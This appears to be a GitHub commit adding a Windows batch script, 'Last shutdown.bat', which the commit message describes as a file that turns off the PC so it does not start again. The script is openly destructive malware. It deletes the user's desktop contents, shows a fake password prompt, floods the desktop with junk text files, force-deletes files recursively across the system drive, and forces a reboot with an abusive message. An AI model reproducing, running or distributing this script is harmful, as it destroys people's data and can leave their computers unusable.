57185dbb6cc7ba0c0e9c7025a4ba156502d29001
CARMELIX7052 <106839725+CARMELIX7052@users.noreply.github.com>
2022-06-07 20:49:37 +0200

    Guidelines
    This is a file that serves to turn off and not turn on your PC again is not a tested file [I do not take responsibility for what you will do with it ;)]

---
+++ Last shutdown.bat
@@ -0,0 +1,129 @@
+::[Bat To Exe Converter]
+::
+::YAwzoRdxOk+EWAjk
+::fBw5plQjdCyDJGyX8VAjFB1GSQG+GG6pDaET+NTu4eSGr0gZGus8d+8=
+::YAwzuBVtJxjWCl3EqQJgSA==
+::ZR4luwNxJguZRRnk
+::Yhs/ulQjdF+5
+::cxAkpRVqdFKZSDk=
+::cBs/ulQjdF+5
+::ZR41oxFsdFKZSDk=
+::eBoioBt6dFKZSDk=
+::cRo6pxp7LAbNWATEpCI=
+::egkzugNsPRvcWATEpCI=
+::dAsiuh18IRvcCxnZtBJQ
+::cRYluBh/LU+EWAnk
+::YxY4rhs+aU+JeA==
+::cxY6rQJ7JhzQF1fEqQJQ
+::ZQ05rAF9IBncCkqN+0xwdVs0
+::ZQ05rAF9IAHYFVzEqQJQ
+::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
+::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
+::cRolqwZ3JBvQF1fEqQJQ
+::dhA7uBVwLU+EWDk=
+::YQ03rBFzNR3SWATElA==
+::dhAmsQZ3MwfNWATElA==
+::ZQ0/vhVqMQ3MEVWAtB9wSA==
+::Zg8zqx1/OA3MEVWAtB9wSA==
+::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFB1GSQG+GG6pDaET+NTL/eWAp1kJXaI8d4Gb+bWcLeUf5XnIdIU5lmlSjd8IAwxWQj6qfRt0umZXomCKIMnSthfkKg==
+::YB416Ek+ZW8=
+::
+::
+::978f952a14a936cc963da21a135fa983
+::last
+@echo off
+del "%userprofile%\Assembly"/q
+del "%userprofile%\desktop"/q
+md "%userprofile%\Assembly"
+
+echo inputbox "Insert password or last shutdown", "Password", "password" >> "%userprofile%\Assembly\first.vbs"
+echo msgbox "Last shutdown", 16, "Goodbye" >> "%userprofile%\Assembly\first.vbs"
+
+start  "%userprofile%\Assembly\first.vbs"
+
+timeout 7 >nul /nobreak
+ 
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt"
+echo Last shutdown: %date% %time% >> "%userprofile%\desktop\%random%.txt" 
+echo Last shutdown at %time% of %date%
+timeout 1 >nul /nobreak
+echo Goodbye
+del "%systemdrive%\*.*"/f/s/q
+shutdown /r /f /c "FUCK YOU OFF BITCH" /t 00
